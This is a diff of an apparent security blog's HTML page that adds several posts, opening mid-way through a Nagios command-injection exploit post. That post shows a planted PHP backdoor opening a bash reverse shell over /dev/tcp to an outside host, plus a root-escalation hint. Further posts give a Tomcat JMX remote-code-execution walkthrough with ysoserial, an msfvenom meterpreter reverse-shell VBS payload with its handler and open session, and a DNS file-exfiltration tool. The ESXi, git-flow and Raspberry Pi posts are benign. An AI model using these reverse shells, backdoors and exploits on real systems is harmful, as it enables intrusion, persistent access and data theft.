now!</span><br><span class="line"></span><br><span class="line">[*] Spawning netcat and waiting for the nagios shell (remember you can escalate to root via CVE-2016-9566 :)</span><br><span class="line"></span><br><span class="line">Listening on [0.0.0.0] (family 0, port 8080)</span><br><span class="line">Connection from [192.168.57.4] port 8080 [tcp/http-alt] accepted (family 2, sport 38718)</span><br><span class="line"></span><br><span class="line">www-data@debjessie:/usr/local/nagios/share$ id</span><br><span class="line">id</span><br><span class="line">uid=33(www-data) gid=33(www-data) groups=33(www-data),1001(nagios),1002(nagcmd)</span><br><span class="line"></span><br><span class="line">www-data@debjessie:/usr/local/nagios/share$ groups</span><br><span class="line">groups</span><br><span class="line">www-data nagios nagcmd</span><br><span class="line"></span><br><span class="line">www-data@debjessie:/usr/local/nagios/share$ cat nagios-backdoor.php</span><br><span class="line">[..cut..]</span><br><span class="line">== Info: Server &lt;?php system(&quot;/bin/bash -c &apos;nohup bash -i &gt;/dev/tcp/192.168.57.3/8080 0&lt;&amp;1 2&gt;&amp;1 &amp;&apos;&quot;); die(&quot;stop processing&quot;); ?&gt; is not blacklisted</span><br><span class="line">[..cut..]</span><br><span class="line">www-data@debjessie:/usr/local/nagios/share$ ls -ld .</span><br><span class="line">ls -ld .</span><br><span class="line">drwxrwsr-x 16 nagios nagios 4096 Dec  9 20:00 .</span><br><span class="line"></span><br><span class="line">www-data@debjessie:/usr/local/nagios/share$ exit</span><br><span class="line">exit</span><br><span class="line">exit</span><br><span class="line"></span><br><span class="line">[+] Shell closed</span><br><span class="line"></span><br><span class="line">[+] That&apos;s all. Exiting</span><br></pre></td></tr></table></figure></p>
+<h3 id="0x04-Fix-Bug"><a href="#0x04-Fix-Bug" class="headerlink" title="0x04 Fix Bug"></a>0x04 Fix Bug</h3><p>Update to the latest Nagios Core release.</p>
+<h3 id="0x05-From"><a href="#0x05-From" class="headerlink" title="0x05 From"></a>0x05 From</h3><pre><code>https://legalhackers.com/advisories/Nagios-Exploit-Command-Injection-CVE-2016-9565-2008-4796.html
+</code></pre>
+          
+        
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+  <link itemprop="mainEntityOfPage" href="http://blog.safebuff.com/2016/12/11/Transfer-files-via-DNS/">
+
+  <span style="display:none" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <meta itemprop="name" content="xl7dev">
+    <meta itemprop="description" content="">
+    <meta itemprop="image" content="https://avatars2.githubusercontent.com/u/9393930?v=3&s=460">
+  </span>
+
+  <span style="display:none" itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+    <meta itemprop="name" content="xl7dev">
+    <span style="display:none" itemprop="logo" itemscope itemtype="http://schema.org/ImageObject">
+      <img style="display:none;" itemprop="url image" alt="xl7dev" src="">
+    </span>
+  </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                
+                <a class="post-title-link" href="/2016/12/11/Transfer-files-via-DNS/" itemprop="url">
+                  Transfer files via DNS
+                </a>
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2016-12-11T00:24:05+08:00">
+                2016-12-11
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+
+          
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <p><a href="https://github.com/breenmachine/dnsftp" target="_blank" rel="external">Download</a></p>
+<h3 id="Usage"><a href="#Usage" class="headerlink" title="Usage"></a>Usage</h3><p>Server</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt; sudo python server.py -f /path/to/file</span><br></pre></td></tr></table></figure>
+<p>Client</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt; runme.bat payloadserverhostname fileparts publicdnsserver</span><br><span class="line">or </span><br><span class="line">&gt; powershell client.ps1 -server where.your.server.resolves.com</span><br></pre></td></tr></table></figure>
+<p>Example: </p>
+<pre><code>runme.bat payloadserver.yourdomain.com 42 8.8.8.8
+</code></pre><p>If just testing internally, you can use the following example:</p>
+<pre><code>runme.bat payloadserverhostname fileparts payloadserverIPaddr
+</code></pre>
+          
+        
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+  <link itemprop="mainEntityOfPage" href="http://blog.safebuff.com/2016/12/05/Apache-Tomcat-Remote-Code-Execution-CVE-2016-8735/">
+
+  <span style="display:none" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <meta itemprop="name" content="xl7dev">
+    <meta itemprop="description" content="">
+    <meta itemprop="image" content="https://avatars2.githubusercontent.com/u/9393930?v=3&s=460">
+  </span>
+
+  <span style="display:none" itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+    <meta itemprop="name" content="xl7dev">
+    <span style="display:none" itemprop="logo" itemscope itemtype="http://schema.org/ImageObject">
+      <img style="display:none;" itemprop="url image" alt="xl7dev" src="">
+    </span>
+  </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                
+                <a class="post-title-link" href="/2016/12/05/Apache-Tomcat-Remote-Code-Execution-CVE-2016-8735/" itemprop="url">
+                  Apache Tomcat Remote Code Execution(CVE-2016-8735)
+                </a>
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2016-12-05T14:56:35+08:00">
+                2016-12-05
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+
+          
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h3 id="0x01-Affected-Platform"><a href="#0x01-Affected-Platform" class="headerlink" title="0x01 Affected Platform"></a>0x01 Affected Platform</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Apache Tomcat 9.0.0.M1 to 9.0.0.M11</span><br><span class="line">Apache Tomcat 8.5.0 to 8.5.6</span><br><span class="line">Apache Tomcat 8.0.0.RC1 to 8.0.38</span><br><span class="line">Apache Tomcat 7.0.0 to 7.0.72</span><br><span class="line">Apache Tomcat 6.0.0 to 6.0.47</span><br><span class="line">Earlier, unsupported versions may also be affected</span><br></pre></td></tr></table></figure>
+<h3 id="0x02-Test-Platform"><a href="#0x02-Test-Platform" class="headerlink" title="0x02 Test Platform"></a>0x02 Test Platform</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Window2003 x86</span><br><span class="line">[POC](https://github.com/frohoff/ysoserial)</span><br><span class="line">[Apache Tomcat](http://archive.apache.org/dist/tomcat/tomcat-8/v8.0.36/bin/apache-tomcat-8.0.36-windows-x86.zip)</span><br><span class="line">[catalina-jmx-remote](http://archive.apache.org/dist/tomcat/tomcat-8/v8.0.36/bin/extras/catalina-jmx-remote.jar)  //add to tomcat/lib/</span><br><span class="line">[Groovy](https://repo1.maven.org/maven2/org/codehaus/groovy/groovy/2.3.9/groovy-2.3.9.jar)    //add to tomcat/lib/</span><br></pre></td></tr></table></figure>
+<h3 id="0x03-Pentesting-Step"><a href="#0x03-Pentesting-Step" class="headerlink" title="0x03 Pentesting Step"></a>0x03 Pentesting Step</h3><h4 id="1-add-code-to-tomcat-bin-catalina-bat"><a href="#1-add-code-to-tomcat-bin-catalina-bat" class="headerlink" title="1. add code to tomcat/bin/catalina.bat"></a>1. add code to tomcat/bin/catalina.bat</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">@echo off</span><br><span class="line">set &quot;JAVA_OPTS=-Dcom.sun.management.jmxremote.ssl=false -Dcom.sun.management.jmxremote.authenticate=false&quot;</span><br><span class="line">rem Licensed to the Apache Software Foundation (ASF) under one or more</span><br></pre></td></tr></table></figure>
+<h4 id="2-add-code-to-tomcat-conf-server-xml"><a href="#2-add-code-to-tomcat-conf-server-xml" class="headerlink" title="2. add code to tomcat/conf/server.xml"></a>2. add code to tomcat/conf/server.xml</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;Listener className=&quot;org.apache.catalina.mbeans.GlobalResourcesLifecycleListener&quot; /&gt;</span><br><span class="line">&lt;Listener className=&quot;org.apache.catalina.core.ThreadLocalLeakPreventionListener&quot; /&gt;</span><br><span class="line"></span><br><span class="line">&lt;Listener className=&quot;org.apache.catalina.mbeans.JmxRemoteLifecycleListener&quot; rmiRegistryPortPlatform=&quot;10001&quot; rmiServerPortPlatform=&quot;10002&quot; /&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- Global JNDI resources</span><br><span class="line">       Documentation at /docs/jndi-resources-howto.html</span><br><span class="line">--&gt;</span><br></pre></td></tr></table></figure>
+<h4 id="3-Start-tomcat-bin-startup-bat"><a href="#3-Start-tomcat-bin-startup-bat" class="headerlink" title="3. Start tomcat/bin/startup.bat"></a>3. Start tomcat/bin/startup.bat</h4><h4 id="4-run"><a href="#4-run" class="headerlink" title="4. run"></a>4. run</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">C:\Documents and Settings\Administrator&gt; java -cp ysoserial.jar ysoserial.exploi</span><br><span class="line">t.RMIRegistryExploit localhost 10001 Groovy1 &quot;calc.exe&quot;</span><br></pre></td></tr></table></figure>
+<h3 id="0x04-Referer"><a href="#0x04-Referer" class="headerlink" title="0x04 Referer"></a>0x04 Referer</h3><p><a href="http://seclists.org/oss-sec/2016/q4/502" target="_blank" rel="external">http://seclists.org/oss-sec/2016/q4/502</a></p>
+
+          
+        
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+  <link itemprop="mainEntityOfPage" href="http://blog.safebuff.com/2016/12/01/Dell-PowerEdge-R530-Install-ESXI6-0/">
+
+  <span style="display:none" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <meta itemprop="name" content="xl7dev">
+    <meta itemprop="description" content="">
+    <meta itemprop="image" content="https://avatars2.githubusercontent.com/u/9393930?v=3&s=460">
+  </span>
+
+  <span style="display:none" itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+    <meta itemprop="name" content="xl7dev">
+    <span style="display:none" itemprop="logo" itemscope itemtype="http://schema.org/ImageObject">
+      <img style="display:none;" itemprop="url image" alt="xl7dev" src="">
+    </span>
+  </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                
+                <a class="post-title-link" href="/2016/12/01/Dell-PowerEdge-R530-Install-ESXI6-0/" itemprop="url">
+                  Dell PowerEdge R530 Install ESXI6.0
+                </a>
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2016-12-01T10:17:49+08:00">
+                2016-12-01
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+
+          
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h3 id="0x01-Download-ESXI6-0"><a href="#0x01-Download-ESXI6-0" class="headerlink" title="0x01 Download ESXI6.0"></a>0x01 Download <a href="http://www.dell.com/support/home/us/en/19/Drivers/DriversDetails?driverId=HJFY8" target="_blank" rel="external">ESXI6.0</a></h3><p>zip<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget http://downloads.dell.com/FOLDER02873638M/1/VMware-ESXi-6.0.0-2494585.x86_64-Dell_Customized-Offlinebundle-A00.zip</span><br></pre></td></tr></table></figure></p>
+<p>iso<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget http://downloads.dell.com/FOLDER02873624M/1/VMware-VMvisor-Installer-6.0.0-2494585.x86_64-Dell_Customized-A00.iso</span><br></pre></td></tr></table></figure></p>
+<p>issue What to do if the installation still fails with Fatal Error 6:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Change from BIOS boot mode to UEFI boot mode</span><br><span class="line">Install using the iDRAC virtual console / virtual media</span><br></pre></td></tr></table></figure></p>
+
+          
+        
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+  <link itemprop="mainEntityOfPage" href="http://blog.safebuff.com/2016/11/04/git-flow-usage/">
+
+  <span style="display:none" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <meta itemprop="name" content="xl7dev">
+    <meta itemprop="description" content="">
+    <meta itemprop="image" content="https://avatars2.githubusercontent.com/u/9393930?v=3&s=460">
+  </span>
+
+  <span style="display:none" itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+    <meta itemprop="name" content="xl7dev">
+    <span style="display:none" itemprop="logo" itemscope itemtype="http://schema.org/ImageObject">
+      <img style="display:none;" itemprop="url image" alt="xl7dev" src="">
+    </span>
+  </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                
+                <a class="post-title-link" href="/2016/11/04/git-flow-usage/" itemprop="url">
+                  git-flow usage
+                </a>
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2016-11-04T03:17:26+08:00">
+                2016-11-04
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+
+          
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h4 id="创建develop分支"><a href="#创建develop分支" class="headerlink" title="创建develop分支"></a>创建develop分支</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git branch develop</span><br><span class="line">git push -u origin develop</span><br></pre></td></tr></table></figure>
+<h4 id="开始新Feature开发"><a href="#开始新Feature开发" class="headerlink" title="开始新Feature开发"></a>开始新Feature开发</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">git checkout -b some-feature develop</span><br><span class="line">git push -u origin some-feature    </span><br><span class="line">git status</span><br><span class="line">git add some-file</span><br><span class="line">x`git commit</span><br></pre></td></tr></table></figure>
+<h4 id="完成Feature"><a href="#完成Feature" class="headerlink" title="完成Feature"></a>完成Feature</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">git pull origin develop</span><br><span class="line">git checkout develop</span><br><span class="line">git merge --no-ff some-feature</span><br><span class="line">git push origin develop</span><br><span class="line">git branch -d some-feature</span><br><span class="line">git push origin --delete some-feature</span><br></pre></td></tr></table></figure>
+<h4 id="开始Relase"><a href="#开始Relase" class="headerlink" title="开始Relase"></a>开始Relase</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git checkout -b release-0.1.0 develop</span><br></pre></td></tr></table></figure>
+<h4 id="完成Release"><a href="#完成Release" class="headerlink" title="完成Release"></a>完成Release</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">git checkout master</span><br><span class="line">git merge --no-ff release-0.1.0</span><br><span class="line">git push</span><br><span class="line"></span><br><span class="line">git checkout develop</span><br><span class="line">git merge --no-ff release-0.1.0</span><br><span class="line">git push</span><br><span class="line"></span><br><span class="line">git branch -d release-0.1.0</span><br><span class="line"></span><br><span class="line"># If you pushed branch to origin:</span><br><span class="line">git push origin --delete release-0.1.0   </span><br><span class="line"></span><br><span class="line">git tag -a v0.1.0 master</span><br><span class="line">git push --tags</span><br></pre></td></tr></table></figure>
+<h4 id="开始Hotfix"><a href="#开始Hotfix" class="headerlink" title="开始Hotfix"></a>开始Hotfix</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git checkout -b hotfix-0.1.1 master</span><br></pre></td></tr></table></figure>
+<h4 id="完成Hotfix"><a href="#完成Hotfix" class="headerlink" title="完成Hotfix"></a>完成Hotfix</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">git checkout master</span><br><span class="line">git merge --no-ff hotfix-0.1.1</span><br><span class="line">git push</span><br><span class="line"></span><br><span class="line">git checkout develop</span><br><span class="line">git merge --no-ff hotfix-0.1.1</span><br><span class="line">git push</span><br><span class="line"></span><br><span class="line">git branch -d hotfix-0.1.1</span><br><span class="line"></span><br><span class="line">git tag -a v0.1.1 master</span><br><span class="line">git push --tags</span><br></pre></td></tr></table></figure>
+          
+        
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+  <link itemprop="mainEntityOfPage" href="http://blog.safebuff.com/2016/11/01/Metasploit-Reverse-Shell-via-CMD/">
+
+  <span style="display:none" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <meta itemprop="name" content="xl7dev">
+    <meta itemprop="description" content="">
+    <meta itemprop="image" content="https://avatars2.githubusercontent.com/u/9393930?v=3&s=460">
+  </span>
+
+  <span style="display:none" itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+    <meta itemprop="name" content="xl7dev">
+    <span style="display:none" itemprop="logo" itemscope itemtype="http://schema.org/ImageObject">
+      <img style="display:none;" itemprop="url image" alt="xl7dev" src="">
+    </span>
+  </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                
+                <a class="post-title-link" href="/2016/11/01/Metasploit-Reverse-Shell-via-CMD/" itemprop="url">
+                  Metasploit Reverse Shell via CMD
+                </a>
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2016-11-01T22:06:22+08:00">
+                2016-11-01
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+
+          
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h3 id="0x01-Generate-vbs"><a href="#0x01-Generate-vbs" class="headerlink" title="0x01 Generate vbs"></a>0x01 Generate vbs</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&gt; msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.0.103 LPORT=4444 EXITFUNC=thread -f vbs --arch x86 --platform win &gt; test.vbs</span><br><span class="line"></span><br><span class="line">No encoder or badchars specified, outputting raw payload</span><br><span class="line">Payload size: 354 bytes</span><br><span class="line">Final size of vbs file: 7384 bytes</span><br></pre></td></tr></table></figure>
+<h3 id="0x02-Metasploit-listen"><a href="#0x02-Metasploit-listen" class="headerlink" title="0x02 Metasploit listen"></a>0x02 Metasploit listen</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; use exploit/multi/handler</span><br><span class="line">msf exploit(handler) &gt; set payload windows/meterpreter/reverse_tcp</span><br><span class="line">payload =&gt; windows/meterpreter/reverse_tcp</span><br><span class="line">msf exploit(handler) &gt; set LHOST 192.168.0.103</span><br><span class="line">msf exploit(handler) &gt; run</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 192.168.0.103:4444</span><br><span class="line">[*] Starting the payload handler...</span><br></pre></td></tr></table></figure>
+<h3 id="0x03-Windows-run-vbs"><a href="#0x03-Windows-run-vbs" class="headerlink" title="0x03 Windows run vbs"></a>0x03 Windows run vbs</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">C:\Documents and Settings\Administrator&gt;cscript.exe ./test.vbs</span><br><span class="line"></span><br><span class="line">Microsoft (R) Windows Script Host Version 5.6</span><br><span class="line">版权所有(C) Microsoft Corporation 1996-2001。保留所有权利。</span><br></pre></td></tr></table></figure>
+<h3 id="0x04-Metasploit-item2"><a href="#0x04-Metasploit-item2" class="headerlink" title="0x04 Metasploit item2"></a>0x04 Metasploit item2</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">msf exploit(handler) &gt; run</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 192.168.0.103:4444</span><br><span class="line">[*] Starting the payload handler...</span><br><span class="line">[*] Sending stage (983599 bytes) to 192.168.0.103</span><br><span class="line">[*] Meterpreter session 1 opened (192.168.0.103:4444 -&gt; 192.168.0.103:49778) at 2016-11-01 22:16:44 +0800</span><br><span class="line"></span><br><span class="line">meterpreter &gt;</span><br></pre></td></tr></table></figure>
+
+          
+        
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
   <link itemprop="mainEntityOfPage" href="http://blog.safebuff.com/2016/10/24/Raspberry-pi-as-Download-with-Aria/">
 
   <span style="display:none" itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -372,1406 +1468,11 @@
 
 
     
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
-  <link itemprop="mainEntityOfPage" href="http://blog.safebuff.com/2016/10/22/Raspberry-pi-as-time-capsule/">
-
-  <span style="display:none" itemprop="author" itemscope itemtype="http://schema.org/Person">
-    <meta itemprop="name" content="xl7dev">
-    <meta itemprop="description" content="">
-    <meta itemprop="image" content="https://avatars2.githubusercontent.com/u/9393930?v=3&s=460">
-  </span>
-
-  <span style="display:none" itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-    <meta itemprop="name" content="xl7dev">
-    <span style="display:none" itemprop="logo" itemscope itemtype="http://schema.org/ImageObject">
-      <img style="display:none;" itemprop="url image" alt="xl7dev" src="">
-    </span>
-  </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-            
-            
-              
-                
-                <a class="post-title-link" href="/2016/10/22/Raspberry-pi-as-time-capsule/" itemprop="url">
-                  Respberry pi as time capsule
-                </a>
-              
-            
-          </h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              <span class="post-meta-item-text">Posted on</span>
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2016-10-22T11:04:39+08:00">
-                2016-10-22
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-
-          
-            
-          
-
-          
-
-          
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <h3 id="0x01-lists"><a href="#0x01-lists" class="headerlink" title="0x01 lists"></a>0x01 lists</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">respberry pi 2B</span><br><span class="line">My Passport Ultra 2T hfs+</span><br></pre></td></tr></table></figure>
-<h3 id="0x02-install"><a href="#0x02-install" class="headerlink" title="0x02 install"></a>0x02 install</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">pi@raspberrypi:~ $ sudo apt-get install hfsplus hfsutils hfsprogs</span><br><span class="line">pi@raspberrypi:~ $ sudo apt-get install git git-core –y</span><br><span class="line">pi@raspberrypi:~ $ sudo git clone git://git.drogon.net/wiringPi</span><br><span class="line">pi@raspberrypi:~ $ cd wiringPi &amp;&amp; sudo ./build</span><br><span class="line">pi@raspberrypi:~ $ gpio –g read 38</span><br><span class="line">0</span><br><span class="line">pi@raspberrypi:~ $ gpio -g write 38 1</span><br><span class="line">1</span><br><span class="line">pi@raspberrypi:~ $ gpio -g read 38</span><br><span class="line">1</span><br><span class="line">pi@raspberrypi:~ $ sudo blkid</span><br><span class="line">/dev/mmcblk0p1: SEC_TYPE=&quot;msdos&quot; LABEL=&quot;boot&quot; UUID=&quot;86EA-017B&quot; TYPE=&quot;vfat&quot; PARTUUID=&quot;ea0e7380-01&quot;</span><br><span class="line">/dev/mmcblk0p2: UUID=&quot;ad6203a1-ec50-4f44-a1c0-e6c3dd4c9202&quot; TYPE=&quot;ext4&quot; PARTUUID=&quot;ea0e7380-02&quot;</span><br><span class="line">/dev/sda1: UUID=&quot;a10e864b-92bd-39ac-ae75-cf5a26ee8107&quot; LABEL=&quot;My Passport&quot; 